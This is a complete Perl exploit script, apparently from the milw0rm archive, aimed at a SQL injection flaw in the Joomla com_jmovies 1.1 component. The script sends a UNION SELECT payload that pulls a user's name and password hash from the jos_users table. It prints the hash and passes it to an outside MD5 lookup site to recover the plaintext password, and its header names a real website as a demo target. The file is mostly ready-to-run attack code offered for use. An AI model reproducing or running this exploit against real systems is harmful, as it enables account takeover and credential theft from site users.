#!/usr/bin/perl -w
# -----------------------------------------------------------
# Joomla Component com_jmovies 1.1 (id) SQL Injection Exploit
# by s3rg3770 with athos :)
# demo http://www.disneyrama.com
# -----------------------------------------------------------
# Note: In lulz we trust :O
# -----------------------------------------------------------

use strict;
use LWP::UserAgent;
use LWP::Simple;


my $host = shift;
my $myid = shift or &help;

my $path = "/index.php?option=com_jmovies&Itemid=29&task=detail&id=-1+".
           "union+select+1,concat(0x215F,username,0x3a,password,0x215F)+".
           "from+jos_users+where+id=${myid}--";

my $http = new LWP::UserAgent(
                               agent   => 'Mozilla/4.5 [en] (Win95; U)',
                               timeout => '5',
                             );  


my $response = $http->get($host.$path); 

if($response->content =~ /!_(.+?)!_/i)
{
     print STDOUT "Hash MD5: $1\n";
     print STDOUT "Password: ".search_md5($1)."\n";
     exit;
}
else
{
     print STDOUT "Exploit Failed!\n";
     exit;
}



sub search_md5
{
     my $hash = shift @_;
     my $cont = undef;

     $cont = get('http://md5.rednoize.com/?p&s=md5&q='.$hash);
        
     if(length($hash) < 32 && !is_error($cont))
     {
          return $cont;
     }
}   


sub help
{
     print STDOUT "Usage: perl $0 [host] [user ID]\n";
     print STDOUT "by athos - staker[at]hotmail[dot]it\n";
     exit;
}

# milw0rm.com [2008-12-03]
